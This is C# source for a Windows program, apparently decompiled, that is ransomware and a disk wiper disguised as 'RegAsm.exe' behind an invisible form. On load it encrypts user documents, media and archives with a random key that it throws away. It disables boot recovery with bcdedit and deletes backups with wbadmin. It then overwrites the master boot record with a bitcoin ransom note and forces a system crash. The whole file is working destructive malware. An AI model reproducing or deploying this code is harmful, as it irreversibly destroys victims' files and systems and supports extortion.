using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace _01;

public class Form1 : Form
{
	private const uint GenericRead = 2147483648u;

	private const uint GenericWrite = 1073741824u;

	private const uint GenericExecute = 536870912u;

	private const uint GenericAll = 268435456u;

	private const uint FileShareRead = 1u;

	private const uint FileShareWrite = 2u;

	private const uint OpenExisting = 3u;

	private const uint FileFlagDeleteOnClose = 67108864u;

	private const uint MbrSize = 512u;

	private string userDir = "C:\\Users\\";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public byte[] Crypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string KeyGen(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("VWXYZ1234567890*!=&?&/的一是不了我在有他这为之大来以个中上们"[random.Next("VWXYZ1234567890*!=&?&/的一是不了我在有他这为之大来以个中上们".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void ty(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = Crypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".encryptedQjbQpkgd.sett4545");
		}
		catch (Exception)
		{
		}
	}

	private void cmds()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "bcdedit.exe";
			processStartInfo.Arguments = "/set {default} bootstatuspolicy ignoreallfailures";
			process.StartInfo = processStartInfo;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private void cmds2()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "bcdedit.exe";
			processStartInfo.Arguments = "/set {default} recoveryenabled no";
			process.StartInfo = processStartInfo;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private void cmds3()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "bcdedit.exe";
			processStartInfo.Arguments = "/set {default} bootstatuspolicy ignoreallfailures";
			process.StartInfo = processStartInfo;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private void cmds4()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "bcdedit.exe";
			processStartInfo.Arguments = "/set {default} recoveryenabled no";
			process.StartInfo = processStartInfo;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private void cmds5()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "wbadmin.exe";
			processStartInfo.Arguments = "delete catalog -quiet";
			process.StartInfo = processStartInfo;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private void cmdall()
	{
		try
		{
			cmds();
			cmds2();
			cmds3();
			cmds4();
			cmds5();
		}
		catch (Exception)
		{
		}
	}

	public void gi(string location, string password)
	{
		try
		{
			string[] source = new string[56]
			{
				".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv",
				".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".mp3",
				".mpa", ".wav", ".wma", ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v", ".mpg",
				".rm", ".srt", ".swf", ".vob", ".wmv", ".3dm", ".3ds", ".max", ".rtf", ".tex",
				".txt", ".wpd", ".pws", ".csv", ".dat", ".ged", ".key", ".bmp", ".mp4", ".webm",
				".svg", ".dat", ".tmp", ".rar", ".zip", ".7z"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					ty(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				gi(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	private static List<string> GetDrives()
	{
		try
		{
			List<string> list = new List<string>();
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text in logicalDrives)
			{
				DriveInfo driveInfo = new DriveInfo(text);
				if (driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom)
				{
					list.Add(text);
				}
			}
			return list;
		}
		catch (Exception)
		{
		}
		return null;
	}

	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	private void stage2()
	{
		List<string> drives = GetDrives();
		for (int i = 0; i < drives.Count; i++)
		{
			try
			{
				byte[] array = new byte[512]
				{
					235, 0, 232, 31, 0, 140, 200, 142, 216, 190,
					51, 124, 232, 0, 0, 80, 252, 138, 4, 60,
					0, 116, 6, 232, 5, 0, 70, 235, 244, 235,
					254, 180, 14, 205, 16, 195, 180, 7, 176, 0,
					183, 9, 185, 0, 0, 186, 79, 24, 205, 16,
					195, 79, 104, 32, 110, 111, 32, 33, 13, 10,
					65, 115, 32, 121, 111, 117, 32, 99, 97, 110,
					32, 115, 101, 101, 44, 32, 121, 111, 117, 114,
					32, 102, 105, 108, 101, 115, 32, 104, 97, 118,
					101, 32, 98, 101, 101, 110, 32, 101, 110, 99,
					114, 121, 112, 116, 101, 100, 32, 97, 110, 100,
					32, 121, 111, 117, 32, 77, 66, 82, 32, 103,
					111, 116, 32, 105, 110, 102, 101, 99, 116, 101,
					100, 46, 32, 66, 117, 116, 32, 100, 111, 110,
					39, 116, 32, 119, 111, 114, 114, 121, 33, 32,
					87, 101, 32, 99, 97, 110, 32, 114, 101, 115,
					116, 111, 114, 101, 32, 116, 104, 101, 109, 33,
					13, 10, 84, 111, 32, 100, 101, 99, 114, 121,
					112, 116, 44, 32, 121, 111, 117, 32, 110, 101,
					101, 100, 32, 116, 111, 32, 119, 114, 105, 116,
					101, 32, 117, 115, 32, 121, 111, 117, 114, 32,
					99, 111, 100, 101, 32, 98, 101, 108, 108, 111,
					119, 32, 97, 110, 100, 32, 112, 97, 121, 32,
					111, 110, 32, 111, 117, 114, 32, 98, 105, 116,
					99, 111, 105, 110, 32, 119, 97, 108, 108, 101,
					116, 46, 13, 10, 89, 111, 117, 114, 32, 105,
					100, 101, 110, 116, 105, 102, 105, 99, 97, 116,
					105, 111, 110, 32, 99, 111, 100, 101, 32, 58,
					32, 88, 52, 50, 88, 51, 54, 54, 55, 88,
					55, 88, 32, 97, 110, 100, 32, 111, 117, 114,
					32, 101, 109, 97, 105, 108, 32, 102, 111, 114,
					32, 99, 111, 110, 116, 97, 99, 116, 32, 58,
					32, 70, 105, 103, 115, 107, 105, 99, 105, 64,
					116, 117, 116, 97, 110, 111, 116, 97, 46, 99,
					111, 109, 13, 10, 89, 111, 117, 32, 104, 97,
					118, 101, 32, 111, 110, 108, 121, 32, 53, 32,
					100, 97, 121, 115, 32, 116, 111, 32, 115, 117,
					98, 109, 105, 116, 32, 121, 111, 117, 114, 32,
					112, 97, 121, 101, 109, 101, 110, 116, 46, 32,
					65, 102, 116, 101, 114, 32, 116, 104, 97, 116,
					44, 32, 121, 111, 117, 114, 32, 99, 111, 109,
					112, 117, 116, 101, 114, 32, 119, 105, 108, 108,
					32, 98, 101, 32, 101, 110, 99, 114, 121, 112,
					116, 101, 100, 32, 102, 111, 114, 101, 118, 101,
					114, 33, 13, 10, 89, 79, 85, 82, 32, 80,
					69, 82, 83, 79, 78, 78, 65, 76, 32, 73,
					68, 32, 58, 32, 52, 83, 71, 102, 52, 103,
					13, 10, 71, 111, 111, 100, 32, 76, 117, 99,
					107, 33, 13, 10, 32, 45, 45, 32, 121, 111,
					117, 114, 32, 104, 97, 114, 100, 100, 105, 115,
					107, 13, 10, 60, 98, 101, 116, 97, 62, 0,
					85, 170
				};
				if (array.Length != 512)
				{
					break;
				}
				IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive" + i, 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
				if (!(intPtr == (IntPtr)(-1)) && WriteFile(intPtr, array, 512u, out var _, IntPtr.Zero))
				{
					RtlAdjustPrivilege(19, bEnablePrivilege: true, IsThreadPrivilege: false, out var _);
					NtRaiseHardError(3221225506u, 0u, 0u, IntPtr.Zero, 6u, out var _);
					continue;
				}
				break;
			}
			catch (Exception)
			{
			}
		}
	}

	private void stage1()
	{
		string location = userDir;
		string password = KeyGen(540);
		gi(location, password);
		password = null;
		Thread.Sleep(1200);
		cmdall();
		stage2();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		stage1();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(53, 49));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("RegAsm.exe");
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
